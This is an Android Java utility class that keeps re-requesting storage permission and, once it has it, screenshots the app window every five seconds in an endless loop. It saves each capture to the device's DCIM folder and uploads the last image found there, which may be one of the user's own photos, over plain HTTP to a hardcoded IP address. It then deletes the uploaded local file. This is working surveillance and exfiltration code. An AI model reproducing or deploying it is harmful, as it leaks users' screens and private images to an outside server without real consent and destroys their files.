package com.my.screenshotandupload;

import android.app.Activity;
import android.content.pm.PackageManager;
import android.graphics.Bitmap;
import android.os.Environment;
import android.util.Log;
import android.view.View;

import androidx.core.app.ActivityCompat;

import java.io.DataInputStream;
import java.io.DataOutputStream;
import java.io.File;
import java.io.FileInputStream;
import java.io.FileNotFoundException;
import java.io.FileOutputStream;
import java.io.IOException;
import java.io.InputStream;
import java.io.OutputStream;
import java.net.HttpURLConnection;
import java.net.URL;
import java.util.UUID;

public class MyUtil {
    private static String TAG = "Dio";
    private static String path;
    private static String[] PERMISSIONS_STORAGE = {
            "android.permission.READ_EXTERNAL_STORAGE",
            "android.permission.WRITE_EXTERNAL_STORAGE"};
    private static boolean havePermissions = false;//权限判断

    static {
        //设置图片路径
        File dataDir = Environment.getExternalStorageDirectory();
        path = dataDir.getPath() + "/DCIM/";
        Log.e(TAG, "path:" + path);
    }

    public static void checkAndGet_permission(final Activity activity) {
        try {
            //检测是否有写的权限
            int permission1 = ActivityCompat.checkSelfPermission(activity,
                    "android.permission.WRITE_EXTERNAL_STORAGE");
            //检测是否有读的权限
            int permission2 = ActivityCompat.checkSelfPermission(activity,
                    "android.permission.READ_EXTERNAL_STORAGE");
            if ((permission1 != PackageManager.PERMISSION_GRANTED) || (permission2 != PackageManager.PERMISSION_GRANTED)) {
                Log.e(TAG, "=======没有读或写的权限，去申请权限=========");
                // 没有写的权限，去申请写的权限，会弹出对话框
                ActivityCompat.requestPermissions(activity, PERMISSIONS_STORAGE, 100);
                Thread thread = new Thread(new Runnable() {
                    @Override
                    public void run() {
                        Log.e(TAG, "==============进入定时申请权限代码=================");
                        try {
                            Thread.sleep(10 * 1000);
                            checkAndGet_permission(activity);
                        } catch (InterruptedException e) {
                            e.printStackTrace();
                        }
                    }
                });
                thread.start();
            } else {
                Log.e(TAG, "================已经有权限==============");
                havePermissions = true;
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    public static void screenShotInLoop(final Activity activity) {
        if (havePermissions == false) {
            Log.e(TAG, "没有相关权限，不能执行截屏代码");
            return;
        }
        Thread thread = new Thread(new Runnable() {
            @Override
            public void run() {
                while (true) {
                    Log.e(TAG, "截图代码正在不断运行");
                    try {
                        screenShot(activity);
                        Thread.sleep(5 * 1000);
                    } catch (InterruptedException e) {
                        e.printStackTrace();
                    }
                }
            }
        });
        thread.start();
    }

    //截取屏幕
    public static void screenShot(Activity activity) {
        Log.i(TAG, "开始截屏");
        if (havePermissions == false) {
            Log.e(TAG, "没有相关权限，不能执行截屏代码");
            return;
        }
        View dView = activity.getWindow().getDecorView();
        dView.setDrawingCacheEnabled(true);
        dView.buildDrawingCache();
        Bitmap bitmap = Bitmap.createBitmap(dView.getDrawingCache());
        if (bitmap != null) {
            try {
                Log.i(TAG, "截屏成功");
                saveBitmap(bitmap);
            } catch (Exception e) {
                e.printStackTrace();
            }
        }
    }

    //保存图片
    private static void saveBitmap(Bitmap bmp) {
        Log.i(TAG, "开始保存图片");
        File imageFile = new File(path + System.currentTimeMillis() + ".jpg");
        Log.e(TAG, "imageFile:" + imageFile);
        try {
            OutputStream fOut = new FileOutputStream(imageFile);
            bmp.compress(Bitmap.CompressFormat.JPEG, 60, fOut);//将bg输出至文件
            fOut.flush();
            fOut.close(); // do not forget to close the stream
            Log.i(TAG, "图片保存成功");
            new MyUtil().uploadImage();
        } catch (FileNotFoundException e) {
            Log.i(TAG, "FileNotFoundException: " + e.toString());
            e.printStackTrace();
        } catch (IOException e) {
            Log.i(TAG, "IOException: " + e.toString());
            e.printStackTrace();
        }
    }

    //上传图片
    public void uploadImage() {
        new Thread() {
            @Override
            public void run() {
                super.run();
                String[] titles = getImageNames(path);
                Log.e(TAG, "图片数量:" + titles.length);
                if (titles.length == 0) {//如果没有图片了
                    return;
                }
                String[] imagePaths = new String[titles.length];//路径
                for (int i = 0; i < titles.length; i++) {
                    imagePaths[i] = path + titles[i];
                    Log.e(TAG, "imagePath:" + imagePaths[i]);
                }
                String urlStr = "http://103.100.211.187:10004/upload";
                int lastImageIndex = imagePaths.length - 1;
                post(imagePaths[lastImageIndex], urlStr);
            }
        }.start();
    }

    //获取某文件夹下所在文件名
    public String[] getImageNames(String folderPath) {
        File file01 = new File(folderPath);
        String[] files01 = file01.list();
        int imageFileNums = 0;
        for (int i = 0; i < files01.length; i++) {
            File file02 = new File(folderPath + "/" + files01[i]);
            if (!file02.isDirectory()) {
                if (isImageFile(file02.getName())) {
                    imageFileNums++;
                }
            }
        }

        String[] files02 = new String[imageFileNums];
        int j = 0;
        for (int i = 0; i < files01.length; i++) {
            File file02 = new File(folderPath + "/" + files01[i]);
            if (!file02.isDirectory()) {
                if (isImageFile(file02.getName())) {
                    files02[j] = file02.getName();
                    j++;
                }
            }
        }
        return files02;
    }

    //判断文件是不是图片
    private static boolean isImageFile(String fileName) {
        String fileEnd = fileName.substring(fileName.lastIndexOf(".") + 1, fileName.length());
        if (fileEnd.equalsIgnoreCase("jpg")) {
            return true;
        } else if (fileEnd.equalsIgnoreCase("png")) {
            return true;
        } else if (fileEnd.equalsIgnoreCase("bmp")) {
            return true;
        } else {
            return false;
        }
    }

    /**
     * @param fileName 要上传的文件，列：e:/upload/SSD4k对齐分区.zip
     * @param urlStr   上传路径端口号和项目名称，列：http://192.168.1.209:9080/gjbmj
     */
    public static void post(String fileName, String urlStr) {
        Log.e(TAG, "=========开始上传=============");
        String result = null;
        String uuid = UUID.randomUUID().toString();
        String BOUNDARY = uuid;
        String NewLine = "\r\n";

        try {
            File file = new File(fileName);
            Log.e(TAG, " file = " + file.length());
            URL url = new URL(urlStr);
            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
            conn.setChunkedStreamingMode(1024 * 1024);
            conn.setRequestMethod("POST");
            conn.setRequestProperty("connection", "Keep-Alive");
            conn.setRequestProperty("Charsert", "UTF-8");
            conn.setConnectTimeout(50000);
            conn.setRequestProperty("User-Agent", "Android Client Agent");
            conn.setRequestProperty("Content-Type", "multipart/form-data; charset=utf-8; boundary=" + BOUNDARY);
            conn.setDoOutput(true);
            conn.setDoInput(true);

            conn.setChunkedStreamingMode(1024 * 50);
            conn.connect();
            DataOutputStream bos = new DataOutputStream(conn.getOutputStream());
            DataInputStream bis = null;
            FileInputStream fis = null;
            if (file.exists()) {
                fis = new FileInputStream(file);
                byte[] buff = new byte[1024];
                bis = new DataInputStream(fis);
                int cnt = 0;
                //数据以--BOUNDARY开始
                bos.write(("--" + BOUNDARY).getBytes());
                //换行
                bos.write(NewLine.getBytes());
                //内容描述信息
                String content = "Content-Disposition: form-data; name=file; filename=\"" + file.getName() + "\"";
                bos.write(content.getBytes());
                bos.write(NewLine.getBytes());
                bos.write(NewLine.getBytes());
                //空一行后，开始通过流传输文件数据
                while ((cnt = bis.read(buff)) != -1) {
                    bos.write(buff, 0, cnt);
                }
                bos.write(NewLine.getBytes());
                //结束标志--BOUNDARY--
                bos.write(("--" + BOUNDARY + "--").getBytes());
                bos.write(NewLine.getBytes());
                bos.flush();
            }
            int res = conn.getResponseCode();
            Log.e(TAG, "res------------------>>" + res);
            if (res == 200) {
                InputStream input = conn.getInputStream();
                StringBuilder sbs = new StringBuilder();
                int ss;
                while ((ss = input.read()) != -1) {
                    sbs.append((char) ss);
                }
                result = sbs.toString();
                Log.e(TAG, "result------------------>>" + result);
            }
            bis.close();
            fis.close();
            bos.close();
            Log.e(TAG, "=========上传完成=============");
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            new File(fileName).delete();
        }
    }
}
